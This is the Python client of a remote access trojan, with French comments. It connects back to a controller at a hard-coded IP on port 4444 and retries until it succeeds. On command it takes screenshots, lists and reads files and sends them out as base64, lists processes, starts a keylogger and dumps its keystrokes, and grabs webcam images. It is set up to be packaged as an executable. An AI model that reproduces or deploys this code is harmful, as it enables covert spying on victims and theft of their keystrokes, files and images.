import sys
import socket
import subprocess
import os
import pyautogui
import platform
import io
import time
from protocol import send_data, send_base64
from modules import keylogger
from modules import screen_capture
from modules import file_manager
from modules import webcam

if getattr(sys, 'frozen', False):
    # PyInstaller : mode exécutable
    os.chdir(sys._MEIPASS)

# Adresse IP du contrôleur
SERVER_IP = "192.168.1.10"
PORT = 4444

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, PORT))
            return s
        except:
            time.sleep(5)

def capture_screen():
    screenshot = pyautogui.screenshot()
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    return buffer.getvalue()

def list_files():
    return "\n".join(os.listdir("."))

def list_processes():
    if platform.system() == "Windows":
        cmd = "tasklist"
    else:
        cmd = "ps aux"
    try:
        return subprocess.check_output(cmd, shell=True).decode()
    except:
        return "Erreur d'exécution de la commande"

def shell_command():
    try:
        return subprocess.check_output("whoami", shell=True).decode()
    except:
        return "Erreur shell"

def start_client():
    s = connect_to_server()

    while True:
        try:
            command = s.recv(1024).decode()
            if command == "shell":
                result = shell_command()
                send_data(s, result)

            elif command == "screencap":
                img = screen_capture.take_screenshot()
                send_base64(s, img)

            elif command == "listfiles":
                result = list_files()
                send_data(s, result)

            elif command == "process":
                result = list_processes()
                send_data(s, result)

            elif command == "keylogger":
                send_data(s, "[Keylogger activé (simulation)]")

            elif command == "keylogger_start":
                keylogger.start_keylogger()
                send_data(s, "[Keylogger démarré]")

            elif command == "keylogger_dump":
                logs = keylogger.get_logs()
                send_data(s, logs if logs else "[Aucune frappe détectée]")

            elif command.startswith("listfiles"):
                path = command.split(" ", 1)[1] if " " in command else "."
                result = file_manager.list_directory(path)
                send_data(s, result)

            elif command.startswith("readfile"):
                path = command.split(" ", 1)[1] if " " in command else ""
                result = file_manager.read_file(path)
                send_base64(s, result)

            elif command == "webcam":
                img = webcam.capture_webcam()
                if img:
                    send_base64(s, img)
                else:
                    send_data(s, "[Erreur webcam]")

            elif command == "exit":
                s.close()
                break
            else:
                send_data(s, "Commande inconnue.")
        except Exception as e:
            try:
                send_data(s, f"[Erreur client] {str(e)}")
            except:
                pass
            s = connect_to_server()

if __name__ == "__main__":
    start_client()
